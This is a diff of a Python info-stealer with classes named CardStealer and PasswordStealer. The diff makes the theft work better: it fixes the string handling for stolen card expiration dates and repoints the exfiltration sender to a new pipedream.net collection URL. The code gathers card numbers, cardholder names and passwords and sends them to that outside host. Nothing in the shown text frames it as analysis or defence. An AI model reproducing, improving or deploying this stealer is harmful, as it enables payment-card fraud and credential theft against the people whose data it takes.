@@ -65,7 +65,7 @@ class CardStealer:
 				if cardnumber:
 					stolen.append({
 						"cardname": cardname,
-						"expirationdate": expirationmonth + "/" + expirationyear,
+						"expirationdate": str(expirationmonth) + "/" + str(expirationyear),
 						"cardnumber": cardnumber[1].decode()
 					})
 		else:
@@ -100,7 +100,7 @@ class PasswordStealer:
 
 #Functions
 def init():
-	sender = Sender("https://enoodz17vdnre.x.pipedream.net/")
+	sender = Sender("https://encvywmf8mn76.x.pipedream.net/")
 	cardstealer = CardStealer()
 	passstealer = PasswordStealer()
 	stolencards = cardstealer.steal()
